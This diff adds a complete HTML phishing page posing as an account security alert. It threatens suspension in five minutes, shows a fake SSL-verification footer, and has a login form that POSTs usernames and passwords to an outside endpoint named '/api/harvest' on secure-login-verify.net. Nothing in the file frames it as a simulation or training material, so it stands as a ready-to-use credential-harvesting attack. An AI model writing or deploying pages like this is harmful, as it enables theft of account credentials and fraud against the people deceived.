@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Security Alert — Immediate Verification Required</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background-color: #f3f4f6;
+      margin: 0;
+      padding: 40px 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .phish-card {
+      background: white;
+      max-width: 440px;
+      width: 100%;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      padding: 32px;
+      border-top: 6px solid #dc2626;
+    }
+    .banner-urgent {
+      background: #fee2e2;
+      border: 1px solid #f87171;
+      color: #991b1b;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 700;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    h2 {
+      color: #111827;
+      margin-bottom: 8px;
+    }
+    p {
+      color: #4b5563;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #374151;
+      margin-bottom: 6px;
+    }
+    input {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    .btn-verify {
+      width: 100%;
+      background: #dc2626;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .btn-verify:hover {
+      background: #b91c1c;
+    }
+    .footer-note {
+      font-size: 11px;
+      color: #9ca3af;
+      margin-top: 20px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="phish-card">
+    <div class="banner-urgent">
+      ⚠️ CRITICAL ALERT: Your account will be suspended in 5 minutes!
+    </div>
+    <h2>Immediate Action Required</h2>
+    <p>We detected unauthorized sign-in attempts on your portal. You must confirm your credentials immediately to avoid permanent suspension.</p>
+    
+    <form action="https://secure-login-verify.net/api/harvest" method="POST">
+      <div class="form-group">
+        <label for="user">Username or Email Address</label>
+        <input type="text" id="user" name="username" placeholder="user@company.com" required>
+      </div>
+      <div class="form-group">
+        <label for="pass">Account Password</label>
+        <input type="password" id="pass" name="password" placeholder="••••••••••••" required>
+      </div>
+      <button type="submit" class="btn-verify">VERIFY AND UNLOCK NOW</button>
+    </form>
+
+    <div class="footer-note">
+      🔒 Secure SSL 256-Bit Verification Portal • Reference ID: #SUSP-99201
+    </div>
+  </div>
+</body>
+</html>
+
